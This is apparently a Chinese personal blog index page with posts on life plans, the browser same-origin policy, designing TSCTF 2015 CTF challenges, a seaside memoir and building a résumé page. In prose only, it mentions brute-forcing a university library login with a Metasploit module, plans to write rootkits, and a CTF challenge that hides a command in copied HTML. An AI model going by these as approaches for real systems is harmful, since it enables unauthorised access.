<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/2/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    
      
      

      
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2015/06/12/" itemprop="url">
                  一团乱麻
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-06-12T00:00:00+08:00" content="2015-06-12">
              2015-06-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2015/06/12/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/06/12//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>这一个月在完成实验室的某某项目，对浏览器的混乱性有更加身临其境的体会。</p>
<p>顺便，因为看了别人的metasploit模块，自己也写了个图书馆登录brute force玩玩。跟着wiki和已有的模块好像也不是什么难事。结果真是爱上ruby这门让程序员感到快乐的语言了。正如metasploit unleash 里所说的，因为mixin和各种语法糖，ruby rocks！</p>
<p>而js，由于种种历史和现实原因，可以说是一团乱麻。把javascript the good parts看完，感慨这门语言的强大表现力和灵活性的同时，也感慨灵活而来的种种问题。</p>
<p>百度前端技术学院的作业倒是很久没有动手了，360的前端培训营我给拒了。。。很庆幸没去，到白河湾臭水沟get漂流技能，到高大上的英东游泳馆get摄影技能和跳发技能。感谢某大软安和某游泳队，哈哈。</p>
<p>但是，js却一直在看，没怎么写，总觉得太灵活驾驭不住。把YDKJS的scope那本看完，似乎对很多问题都清楚了很多，然后this、object和prototype只看到mixin章节，不过感觉基础的知识都讲到了。另外YDKJS关于ES6讲的比较多，额。。。</p>
<p>想做个qq机器人，最后也没空做，看到<a href="https://github.com/xhan/qqbot" target="_blank" rel="external">qqbot</a>又瞄了两眼coffee script，觉得似乎ES6和coffee script解决了相同的问题= =，然而coffee script的语法比纯js，es6的js更好看。。。</p>
<p>康神把相机留给我玩了，这两天北京的蓝天和白云美的让人心醉。<a href="http://d0u9.xyz" target="_blank" rel="external">d0u9</a>带着我开始拍云彩，爬到主楼阴森的顶楼排夜景。直到开始处理图像，才觉得电脑性能真是不堪。</p>
<p>n多计划，一团乱麻。</p>
<ul>
<li>囚徒健身</li>
<li><p>包干游泳</p>
</li>
<li><p>图像处理技能</p>
</li>
<li>绘图技能</li>
<li><p>摄影技能</p>
</li>
<li><p>在树莓派上布置蜜罐。</p>
</li>
<li>完善ssh扫描器搜集iphone信息</li>
<li>完善某项目中关于某设备的批量扫描嗅探</li>
<li><p>看各种lkm/内存映射/用户态/GPU rootkit代码，写rootkit</p>
</li>
<li><p>百度前端技术学院作业，PC版和移动版</p>
</li>
<li><p>在树莓派上写个基于node+websocket的聊天室玩</p>
</li>
<li><p>把搁置多年的操作系统写完，也许再用rust写一遍。</p>
</li>
<li><p>看书，rust手册，YDKJS，metasploit unleash</p>
</li>
<li>看代码，某设备加密算法js实现，某些js库的一些源码，metasploit的一些代码，一些linux内核模块代码(iptables)</li>
<li><p>linux下安全审计接触的一些东西。如何发现被入侵，pam，audit，iptables这些都怎么回事。嗯。。。还有SELinux。。。</p>
</li>
<li><p>毕设，操作系统原理，shellcode和libemu，各种数据挖掘算法。</p>
</li>
</ul>
<p>几篇可能会补上的：</p>
<ol>
<li>浏览器安全，xss能做到什么，怎么做，keylogger实现，扫描器，beef项目。</li>
<li>metasploit模块编写——ruby rocks</li>
<li>树莓派——坑爹的安装配置之旅。升级到jessie，配置winATE。</li>
<li>某某加密算法源码解析(不公开)</li>
</ol>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/security/2015/06/01/security-in-browsers/" itemprop="url">
                  Security in Browsers
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-06-01T00:00:00+08:00" content="2015-06-01">
              2015-06-01
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/security/" itemprop="url" rel="index">
                    <span itemprop="name">security</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/security/2015/06/01/security-in-browsers/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="security/2015/06/01/security-in-browsers/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="同源策略">同源策略</h2><p>同源策略限制来自某个源的文档或者脚本与另一个源的资源交互。同源策略用来阻止一些CSRF攻击。</p>
<h3 id="定义">定义</h3><p>协议+端口(如果指定)+主机都相同。</p>
<h4 id="继承源">继承源</h4><p>来自<code>about:blank</code>，<code>javascript:</code>和<code>data:</code>的URL内容继承加载这个文档的URL的源，因为它自身并没有关于源的信息。</p>
<h4 id="IE特例">IE特例</h4><p>IE有两个关于同源策略的例外：</p>
<ol>
<li>信任区域(Trust Zones):如果两个域名高度互信，比如同一个公司域名，不使用同源策略。</li>
<li>端口：IE的同源策略不考虑端口。</li>
</ol>
<h3 id="变更源">变更源</h3><p>更改页面的源受到限制。脚本可以把<code>document.domain</code>设成当前domain的子集。之后就以此可以作为同源检查的源。例如，页面<code>http://store.company.com/dir/other.html</code>上的脚本可以这样：</p>
<pre><code>document<span class="class">.domain</span> = <span class="string">"company.com"</span>
</code></pre><p>注意必要时要指定端口号，否则会被赋值成null。</p>
<p>让子域安全访问父域必须将两者的<code>document.domain</code>设置为相同。</p>
<h3 id="跨域网络访问">跨域网络访问</h3><p>同源策略控制两个不同源的交互，当使用<code>XMLHttpRequest</code>或者<code>img</code>标签时。这些交互分为3类：</p>
<ol>
<li>跨域<code>写入</code>通常是允许的。例如链接(links)，重定向(redirects)和表单提交。某些罕见的HTTP请求需要<code>preflight</code>。</li>
<li>跨域嵌入通常是允许的。例子如下</li>
<li>跨域读取通常不允许，但通常通过嵌入泄漏了不可读内容。例如你可以读到嵌入图像的长宽，嵌入脚本的行为，或者<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=629094" target="_blank" rel="external">嵌入资源的可访问性</a>。</li>
</ol>
<p>以下是一些跨域嵌入的例子：</p>
<ul>
<li>通过<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>嵌入的JS。语法错误信息只能在同源脚本中捕捉到。(然我并不理解，只看到浏览器可以捕捉到引入脚本的语法错误)</li>
<li>通过<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>嵌入的CSS。由于CSS松散的语法规则，同源策略要求跨域CSS有正确的<code>Content-Type</code>头。各个浏览器对跨域CSS的限制都不同。</li>
<li>通过<code>&lt;img&gt;</code>嵌入的图像，支持png，jpeg，gif，bmp，svg。。。格式</li>
<li>通过<code>&lt;video&gt;</code>和<code>&lt;audio&gt;</code>嵌入媒体文件。</li>
<li><code>&lt;object&gt;</code>，<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>嵌入的插件。</li>
<li>通过<code>@font-face</code>嵌入的字体。有些浏览器允许跨域字体，有的不行。</li>
<li>任何<code>&lt;iframe&gt;</code>或者<code>&lt;frame&gt;</code>嵌入的东西，网站可以通过设置<code>X-Frame-Options</code>头阻止这种跨域。</li>
</ul>
<h4 id="如何允许跨域访问">如何允许跨域访问</h4><p>使用CORS</p>
<h4 id="如何阻止跨域访问">如何阻止跨域访问</h4>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2015/05/24/hacking-security/" itemprop="url">
                  Hacking Security
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-05-24T00:00:00+08:00" content="2015-05-24">
              2015-05-24
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2015/05/24/hacking-security/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/05/24/hacking-security/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="TSCTF2015">TSCTF2015</h2><p><img src="/images/tsctf.png" alt="TSCTF2015" title="TSCTF2015"></p>
<p>准备折腾近乎三周的TSCTF终于在昨天圆满结束，这三周来眼见到主板者的耐心与热情，亲历他们的付出与坚持。非常敬佩在此次活动中付诸心血和时间的所有人，以及他们在比赛承办过程中显示的卓越智慧和气质。</p>
<p>至于为何社团忽然建立，为何和阿里巴巴技术联盟一起举办了个校内赛，其中错综复杂种种并不清楚。后来颁奖阿里巴巴安全部技术总监和一位HR姐姐来了，对总监的名字非常眼熟，但我记得是在绿盟而不是阿里，抱着试试看的心理一问竟然真是siblly。没想到绿盟上市后这么多人离开了。</p>
<p>第一次见到天枢的幕后BOSS，没有他大概场地和资源都连影都没有，当然没有阿里也就没有主干道不输天池大数据和微软编程之美的霸气展板和外场宣传，也没影了大多数奖品，一个校赛宣传和奖品规格真是不低。</p>
<p>比赛中出了两道misc题目。有兴趣可以玩玩，根据题目提示获取flag，flag形式为TSCTF{xxxxxxxxxxxxxxxxx}的格式</p>
<ul>
<li>初赛misc3：<a href="http://buptlug.cn/steganography.html" target="_blank" rel="external">Steganography</a></li>
<li>决赛misc4：<a href="http://buptlug.cn/what-you-copy-is-not-you-want.html" target="_blank" rel="external">What You Copy is Not What You Want</a></li>
</ul>
<p>如果觉得有意思不要忘记评论点赞哈哈。</p>
<p>我并没有怎么参加过CTF这种牛逼哄哄的比赛，只是前一阵的ALICTF，被室友拉去打了个酱油，再我碌碌无为并未成功调出任何逆向题目和web题目的情况下，队友连下apk和web若干题目，硬是把排名拉到63左右。</p>
<p>我个人只玩过360在14年的hack game，overthewire上natas，krypto和bandit的题目，coolshell博主当年给大家玩得一个游戏。能有幸参与TSCTF的出题，真是不胜荣幸。</p>
<p>题目的设计要有粘性，有趣味，能吸引玩家往下继续深入。而不是依靠隐藏某些信息或假设玩家知道哪些信息，玩家可能是千差万别的所以一个好的题目设计并不容易。我想谈谈所看到TSCTF中的一些题目设计。</p>
<h3 id="ws">ws</h3><p>首先是我自己的决赛Misc4。最开始的设计来源于<a href="http://www.soimort.org/posts/154/" target="_blank" rel="external">soimort的一个博文</a>，告诫大家不要把html中的代码直接复制到可执行环境中去，并展示了这种危险性。我觉得一个题目要让大家感觉到很有意思，就要用令人惊奇的方式欺骗大家的眼睛，但这种欺骗并不是为了掩盖有利于解题的信息，而是让玩家能在解题的道路上体验到这种惊奇的感觉。</p>
<p>所以，开始的时候是提示了一个</p>
<pre><code><span class="built_in">echo</span> VGVhY2hlciBHOiB0aGVyZSBpcyBhIGxhbmd1YWdlIHdob3NlIG5hbWUgaXMgd2hpdGVzcGFjZQ== | base64 <span class="operator">-d</span>
</code></pre><p>我的想法很简单，玩家看到这个命令后很可能会直接把命令复制到控制台，实际上这个html偷偷藏了个输出到文件的(有点危险额)命令。</p>
<p>万万没想到，大部分人并不使用Unix，他们甚至没有看内容直接看源代码去了。。。卧槽。。。</p>
<p>后来看到使用mac的nemo直接往控制台里粘帖了，可惜后来已经不这么设计了。结果就是他在那里奇怪怎么粘帖的东西和复制的不一样= =</p>
<p>于是，为了引导玩家和照顾非unix使用者，我重新设计了游戏。对js部分进行编码(没有丧心病狂进行加密我好良心的好不好)，让html的dom结构看上去是那么回事，但一旦按下键盘按键或者鼠标就更改dom结构。</p>
<p>之后又改了几次出题组试了试几种常见浏览器，最后才是最终的版本。其实这是给初赛出的题目，Cao直接给放到决赛了。为了引导玩家进行了非常明显的提示，cslei觉得题目应该给分少些，但Cao给了350pts，最终决赛的时候大家率先把misc4完成了，分低的misc123反而好久没人做出来。。。。。。个人觉得misc123缺乏引导，这让人很难想到怎么回事，但一旦知道思路一切都不是问题，所以hint出来后misc1几乎被全A了，没放hint的misc23似乎没什么人玩。关于misc5,一道图片藏图片藏xx藏xx的题目，玩了一晚上，几经崩溃。。。这不是游戏，这是变着戏法虐人。</p>
<h3 id="sandbox">sandbox</h3><p>nemo为决赛出了两道相关的linux下shellcode和sandbox题目，sandbox题目按其设计意图是在shellcode题目的基础上完成。不过后来事情有些出乎意料。</p>
<p>sandbox的题目发到出题组的时候，我完全理解错他的意思了，他设计题目的时候想的是循环计数那里有漏洞，让玩家通过逆向分析，然后用exploit和shellcode来利用那个漏洞。我特么以为是escape shell玩了一晚上，丧心病狂以各种奇葩方式escape shell和dos nemo那个restricted shell环境的结果就是，nemo不断为其过滤黑名单添加各种过滤条件，为了防止fork bomb折腾linux系统配置到两点(建议大家不要在生产环境使用kali，那个给用户的权限高限制少)。我猜肯定还有我们没注意的其它方式，nemo已然不想管了，线下赛反正什么都方便。如果有人通过非设计者设计的方式获得flag那也算一种方式。果然，后来决赛的时候应验了。。。特么有个队shellcode根本没做就把sandbox给a掉了……</p>
<h3 id="天枢web对战平台">天枢web对战平台</h3><p>Teacher G出了一道非常灵活的决赛web题目。基于他们比赛的经验，他从一周前开始设想，最终实现、测试、上线对战系统。题目出得很是新颖，不过玩家的反应有些不太适应。Teacher G最后总结时说大家还是不太灵活。很多他设想的玩法都没有队伍去做。</p>
<p>其设计了一个有多个可利用漏洞的系统，让玩家能通过这几种方式进行对打。设计一个灵活的系统就是必须考虑各种奇葩的状况和面对奇葩的bug，结果就是为了实现这么个平台投入了大量开发和测试运维人力，Teacher G都快被bug和限制玩家的策略折磨哭了<br>，哈哈。</p>
<p>对实现的具体细节，有不同理解的cslei和Teacher G又进行了大量争论和妥协，最终上线后，发现有某个队开始一支独秀，其它队伍还在傻眼被虐中，并且很多人的解题策略安排都被这个题给打乱了。</p>
<p>好在是线下赛，经过我们npc的宏观调控(其实是一个强力的伪玩家，开始设计只是想作为玩家虐待目标)和不断的明示暗示之后，大多数队伍都走上正轨，开始了burp suite对刷大战。之后关于这个平台又放出若干提示，可惜已经晚了，平台大多功能并没有被玩家们使用。甚至。。。第一名竟然放弃了这道题= =</p>
<p>如果时间足够的话，我们还想做web可视化的攻防效果呢。可惜只有Teacher G用mascuee标签实现的好像营业厅广告般的实时战况信息。</p>
<p>很棒的一个想法和实现，总得来说。</p>
<h3 id="Coding题目">Coding题目</h3><p>Coding题目很是中规中矩，cslei在运营社团诸多繁杂事项的时候还一力承担起coding题目。出乎意料的一个是，本来有道分类识别的题目，发现解题者根本没写程序识别而是人工识别。。。。。。</p>
<p>我们说到底还真是人力不足，测试不充分。</p>
<p>大致我关注且印象比较深刻的就这些。</p>
<p>还有件惊奇的事，半年前的暑假，有个大三的学生来我们实验室做过一阵APT攻击的什么研究，今天说起来，才发现出题人之一竟然是他。。。。。。</p>
<p><img src="/images/dubhe.jpg" alt="Hacking Security" title="hacking security"></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2015/05/17/17/" itemprop="url">
                  17
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-05-17T00:00:00+08:00" content="2015-05-17">
              2015-05-17
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2015/05/17/17/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/05/17/17/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>亲爱的神，伟大的神，</p>
<p>你可以怪我想法太过无知但我只是，人</p>
</blockquote>
<h2 id="一">一</h2><p>腥咸的海风吹开了记忆的闸门，想起多年前的某个夏天，真是多年前，在日照的某个离海不远的公路上，一路上都是这种味道，天空明丽的让人害怕，还有夏天毫不留情的烈日，遍目的黄绿清晰的映在视网膜上，映在记忆中。</p>
<p>第一次吃的西瓜，竟然带着咸涩的味道，就好像多年后品尝着自己的泪水。当时只觉得新奇。</p>
<p>那时17岁，自己是新的，世界是新的，什么都是新的。连记忆都是新鲜的。</p>
<h2 id="二">二</h2><p>火车呼呼的向前，就像不可阻遏的时光一样，匆匆带走来不及细看的景色。似曾相识的道旁树，一颗一颗接着一颗，出现，消失，出现，消失</p>
<p>我好像看到了它春天初芽蓬勃向上，转眼就覆盖了白雪归于寂然，前一秒郁郁葱葱，后一刻就萧萧瑟瑟。</p>
<p>这就是我眼中的世界，</p>
<p>这就是让人无力的无常。</p>
<p>人生苦短。</p>
<h2 id="三">三</h2><p>远远望见远处有一堵高大的墙，碧蓝碧蓝的。</p>
<p>这不是我印象中的海，也是我印象中的海，只是从来没想到那堵墙看上去这么高，高不可攀，无法穿越。</p>
<p>多年前的夏天，第一次看到大海。昏黄昏黄的大海，昏黄昏黄的沙滩，远处的渔船，昏黄雾中的落日，一并沙滩上的小螃蟹，击打在脚上打起的浪花，世界都是昏黄的。</p>
<p>一切都是昏黄的，</p>
<p>一切却都是崭新的。</p>
<h2 id="四">四</h2><p>动车上有点冷，我蜷缩在列车前方最右的角落位置，听到列车上在放一首曲子。</p>
<p>旋律是沟通阴阳的桥梁，是穿越时光的隧道，是迷魂之汤与忘情之水。</p>
<p>是通向世界边境冷酷仙境的钥匙。</p>
<p>我清清楚楚记得自己弹过这首歌，还能唤起那种热切的心情和执着的心境，但我想不起来它是什么。</p>
<p>曲子随着空调的风，随着列车上嘈杂的人声，杳无踪迹。</p>
<p>伸手抓不住，眼睁睁的面对残忍的现实。</p>
<p>错过的，就错过吧。</p>
<p>就好像它重来没发生过一样一样的。</p>
<p>其实我后来想起来了，爱的罗曼史</p>
<h2 id="五">五</h2><p>松软的沙滩是再一个能唤醒记忆的东西，脱掉谢，踏上有些滚烫的细沙的第一脚，似曾相识的感觉几乎把人击倒。</p>
<p>某年的某个夏天，满怀欣喜和好奇的心情，准备好了泳衣，终于却没有下水。</p>
<p>海水冰冷的感觉一如既往。</p>
<p>你的幸福感受是什么呢？</p>
<p>与他们一起在海滩漫步，看他们在海滩上风，看他们的身姿和头发在风中飘动。</p>
<p>对了，我试着抓了一把沙</p>
<p>如果抓紧，没这么容易从指缝流失</p>
<h2 id="六">六</h2><p>今天17号，西边日出东边雨，道是无晴却有晴。匆匆地赶回这里，就是为了写下这些。</p>
<p>然而我说不出，也不能指望有人理解。</p>
<p>用记忆和生命体验加密的文字，再多的提示又有何用。</p>
<p>解密出来对别人又有何意义？</p>
<p>在小鱼船上唱着滑板鞋，随着海浪起起伏伏。</p>
<blockquote>
<p>我的生命像海浪一样有时高有时低，你是否告诉坚强自己度过各种时期。</p>
</blockquote>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2015/05/10/" itemprop="url">
                  难写的简历
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-05-10T00:00:00+08:00" content="2015-05-10">
              2015-05-10
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2015/05/10/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/05/10//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>每次写简历都感觉困难重重，半个月前某资深移动安全专家看着我简历说，你这太杂了，没有重点。面试腾讯的时候腾讯的安全面试官说真是够杂的。阿里前端简历都没提到前端的东西，我想如果有HR看到那份简历一定怀疑我投错部门了。不过，我算证实了阿里的笔试根本没人看。</p>
<p>今天又写了大半天简历。缘起在昨天去360前端公开课，奇舞团某位大哥看我没位置让我到前面坐，我直接把月影的位置占了(ゝ∀･)。。。</p>
<p>一直在听文博老师讲课也没注意旁边玩手机的月影的大大<em>(:з」∠)</em>…直到…月影大大给我说:</p>
<blockquote>
<p>小伙子我看你天资聪颖，骨骼惊奇，是个做前端的料子，今日你我有缘，给我发份简历吧。</p>
</blockquote>
<p>开玩笑(ง •̀_•́)ง，当然不是这么说的= =</p>
<p>简历主要参考了以下几个地方，中文还没做。。。</p>
<h2 id="折腾了一天没内容的简历">折腾了一天没内容的简历</h2><p>前一阵在看慕课网上<a href="http://www.imooc.com/learn/252" target="_blank" rel="external">css3实现网页平滑过渡效果</a><br>这个教程，就想这么用这个做简历得了。</p>
<p>既然是给前端团队的简历，而且是给国内顶尖前端团队的简历，而且是直接发给月影的简历，怎么能不尽力用上前端技术。</p>
<p>然后，忽然想到，微信发过去。。。应该是在手机上看吧。。。</p>
<p>这么大个导航栏，不合适吧。</p>
<p>而且按这种技术，没有导航栏没法导航。。。</p>
<p>我想了想，前几天看到<a href="http://www.zhihu.com/question/23150301/answer/32496711" target="_blank" rel="external">Ovilia的CV</a>。。。</p>
<p>又想了想<a href="http://ife.baidu.com/" target="_blank" rel="external">百度IFE</a>的全屏翻页效果。</p>
<p>要么就做全屏翻页效果的。。。</p>
<p>额，怎么实现呢，我自己用原生吧。。。算了，最近做IFE的作业闭门造车太久了。。。还是学习下别人的成果吧。</p>
<p>我想起一个看上去很中意的页面–<a href="http://ecomfe.github.io/fontmin/en" target="_blank" rel="external">fontmin</a></p>
<p>看看它怎么实现的。</p>
<p>看了发现超出我知识范围太多。。。开始看前面的script里有个bdstatic的域名的js文件引用，我以为是统计就去掉了，然后发现require用不了，嗯，我也奇怪没见它引用require.js呢。</p>
<p>有个app是百度自己的，还有copyright。。。算了我这做着玩也不干什么。。</p>
<p>后来仔细一看一查是百度自己做的js模块加载系统。。。<a href="https://github.com/ecomfe/esl" target="_blank" rel="external">esl</a>对此。</p>
<p>算了，我把这个引用进来吧。还用到了jquery，嗯？我是用cdn？算了下载下来吧。。。</p>
<p>还有俩jquery插件，我大概看了看文档，一下午零基础使用jquery及其插件。。。</p>
<p>lettering提供了对字符进行单独样式的功能。开始留着lettering想之后试试，最后懒得试验了。。。然后就把相关文件和函数删了。毕竟文件大了影响加载速度不是ლ(╹◡╹ლ)</p>
<p>full-page这个插件真是方便额，有点像bootstrap把html按规则写好就行，规则还特别特别简单。fullpage这个插件本来还得配合它提供的css用，不过fontmin这个页面把这部分css合并到app.css里了，连js都打包到app.js里了。我猜是为了减少HTTP请求吧。</p>
<p>app.js中放置了所有用到的全屏翻页和lettering等函数，似乎还有各种对兼容性的处理。可是它是压缩并且替换变量过的js。。。回头上github看了看没被压缩的js，除了fullpage的功能就简单的有个判断操作系统修改下载链接和lazy加载的函数，我用不上就删了。。。</p>
<p>它的字体本来觉得不错不想改，结果发现它的英文字体都用fontmin重新做过了，只打包了需要的字符。得，我<code>npm install fontmin</code>得了。自己做了个ClearView的字体，另外把它的SentyBrush重新做出来使之包含我的名字要用到的字符。</p>
<p>所有其它东西处理完毕之后，就是写自己的简历内容。首先想了想怎么安排html，怎么布局。然后就开始写css，看效果，到小屏幕上看效果，写媒体查询。这前一段在百度前端技术学院学到的这些基础真不是白学的。</p>
<p>最后。。。看上去效果还不错。logo我自己做了下，反正对于一个熟练的gimp用户随手处理个图像什么的不是问题。</p>
<p>再最后，懒得压缩css和js啥了。js我还下了个非min的好像，传网上手机看了下还不错。虽然下面有部分看不到了。。。</p>
